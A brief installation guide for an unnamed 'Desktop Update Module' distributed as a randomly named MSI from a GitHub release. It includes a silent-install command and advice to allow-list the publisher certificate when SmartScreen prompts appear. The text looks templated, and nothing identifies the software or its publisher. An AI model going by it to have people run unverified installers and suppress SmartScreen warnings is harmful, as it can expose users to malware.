# Installation guide

## Desktop Update Module

### End users

Download `sc_cftvolkdug61f_v64516.msi` from release `v55978` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v55978` for pilot groups.

### Silent install

```
sc_cftvolkdug61f_v64516.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
